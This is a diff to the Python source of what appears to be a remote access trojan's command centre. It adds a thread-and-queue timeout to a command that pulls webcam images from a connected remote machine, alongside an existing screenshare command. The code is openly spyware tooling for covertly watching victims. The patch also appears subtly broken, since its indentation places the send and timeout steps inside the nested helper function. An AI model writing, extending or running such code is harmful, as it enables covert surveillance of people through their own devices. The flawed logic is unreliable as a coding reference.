@@ -10,6 +10,7 @@ import argparse
 import shutil
 import threading
 import platform
+import queue
 import PyInstaller.__main__
 from datetime import datetime
 
@@ -532,13 +533,34 @@ class COMMCENTER:
     def c_screenshare(self):
         from mods.screenshare import ScreenShareServer
         ScreenShareServer().start_server()
+
     def c_webcam_capture(self):
-        if self.CURRENT:
+        if not self.CURRENT:
+            pull.error("You need to connect before executing this command!")
+            return
+
+        def recv_wrapper(q):
+
+            try:
+                data = self.CURRENT[1].recv_data()
+                q.put(data)
+            except Exception as e:
+                q.put(e)
+
             self.CURRENT[1].send_data("webcam:")
-            result = self.CURRENT[1].recv_data()
+            q = queue.Queue()
+            t = threading.Thread(target=recv_wrapper, args=(q,))
+            t.start()
+            t.join(timeout=7) 
+            if t.is_alive():
+                pull.error("Webcam error: No response within 7 seconds")
+                return
+
+            result = q.get()
+
             if isinstance(result, bytes):
                 dirname = os.path.dirname(__file__)
-                dirname = os.path.join(dirname, 'webcam' )
+                dirname = os.path.join(dirname, 'webcam')
                 if not os.path.isdir(dirname):
                     os.mkdir(dirname)
                 fullpath = os.path.join(dirname, datetime.now().strftime("%d-%m-%Y_%H-%M-%S.png"))
@@ -547,8 +569,6 @@ class COMMCENTER:
                 pull.print("Webcam image saved: [" + pull.DARKCYAN + fullpath + pull.END + "]")
             else:
                 pull.error(f"Webcam error: {result}")
-        else:
-            pull.error("You need to connect before execute this command!")
 
     def c_exit(self):
         sys.stdout.write("\n")
